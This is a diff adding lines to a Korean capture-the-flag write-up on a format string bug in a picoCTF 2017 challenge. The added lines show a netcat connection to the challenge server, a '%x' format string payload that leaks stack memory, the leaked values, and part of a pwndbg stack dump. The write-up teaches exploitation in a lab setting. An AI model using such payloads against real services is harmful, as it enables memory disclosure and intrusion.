@@ -140,6 +140,13 @@ FSB 를 사용하려면 secret 이 몇번째인지 알아야한다.
 main+75 를 보면 ebp-0x10 이 secret 이다.  
 
 ```
+nc shell2017.picoctf.com 55189
+Give me something to say!
+%x %x %x %x %x %x %x %x %x
+40 f7fc7c20 8048792 1 ffffdd34 d7838ff3 3 f7fc73c4 ffffdca0
+Now tell my secret in hex! Secret:
+```
+```
 pwndbg> stack
 00:0000│ esp  0xffffd220 —▸ 0x8049b40 (buffer) ◂— 0x70257025 ('%p%p')
 01:0004│      0xffffd224 ◂— 0x40 /* '@' */
